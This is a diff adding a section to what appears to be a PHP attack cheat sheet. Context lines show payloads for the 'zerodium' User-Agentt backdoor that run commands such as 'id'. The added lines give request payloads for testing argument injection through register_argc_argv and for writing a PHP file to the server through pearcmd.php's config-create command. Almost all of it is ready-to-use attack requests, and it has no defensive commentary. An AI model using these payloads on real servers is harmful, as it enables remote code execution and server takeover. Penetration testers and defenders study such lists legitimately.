@@ -68,3 +68,14 @@ system
 User-Agentt: zerodiumsleep(5);
 User-Agentt: zerodiumsystem('id');
 ```
+
+### Argument injection and write file 
+```
+# if register_argc_argv is enabled
+# check argument injection ($_SERVER['argv'] should contain inject)
+GET /phpinfo.php?inject
+
+# create file using pearcmd (PEAR is used to manage PEAR packages)
+GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/<path>/<to>/<file>.php
+```
+
